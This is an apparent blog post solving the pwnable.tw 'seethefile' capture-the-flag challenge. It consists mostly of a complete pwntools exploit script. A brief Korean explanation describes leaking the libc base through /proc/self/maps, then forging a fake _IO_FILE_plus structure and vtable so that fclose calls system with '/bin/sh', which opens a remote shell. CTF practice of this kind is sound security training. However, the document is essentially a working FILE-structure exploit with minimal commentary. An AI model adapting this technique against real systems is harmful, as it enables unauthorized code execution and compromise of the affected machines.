---
title: "[pwnable.tw]seethefile"
date: 2020-3-4
ctf: Pwnable.tw
layout: post
published : false
---

```
p *((struct _IO_FILE_plus *)0x804B280)
p *((struct _IO_jump_t *)0x804B2B4)
p *_IO_list_all
```

`/proc/self/maps` 로 libc leak해주고 fake  _IO_FILE_plus Struct를 만들어주고 vtable을 조작해 finish를 system 함수로 덮으면 된다. fclose 에서 인자가 fp로 들어가는 부분을 /bin/sh로 덮어주면 된다. 

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./seethefile')
libc = e.libc
libc = ELF('./libc_32.so.6')
# p = process('./seethefile')
p = remote('chall.pwnable.tw',10200)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
filename = 0x0804B080 # 64
magicbuf = 0x0804B0C0 # 416
name = 0x0804B260 # 32
fp = 0x0804B280

def _open(name):
	sla(':','1')
	sla(':',name)

def _read():
	sla(':','2')

def _write():
	sla(':','3')

def _close():
	sla(':','4')

def leave_name(name):
	sla(':','5')
	sla(':',name)

_open('/proc/self/maps')
_read()
_read()
_write()
p.recvuntil('\n')
libc_base = int(p.recv(8),16)
log.info('libc_base : {}'.format(hex(libc_base)))

# _IO_FILE_plus
_fake_struct = '/bin/sh\x00' # 8
_fake_struct += p32(0) * 16
_fake_struct += p32(name)
_fake_struct += p32(0) * 18
# print len(_fake_struct) + 36
_fake_struct += p32(name + 188)

# _IO_file_jumps
_fake_vtable = p32(0) * 17
_fake_vtable += p32(libc_base + libc.symbols['system'])

payload = p32(0) * 8
payload += p32(name + 36)
payload += _fake_struct
payload += _fake_vtable

leave_name(payload)

p.interactive()
```

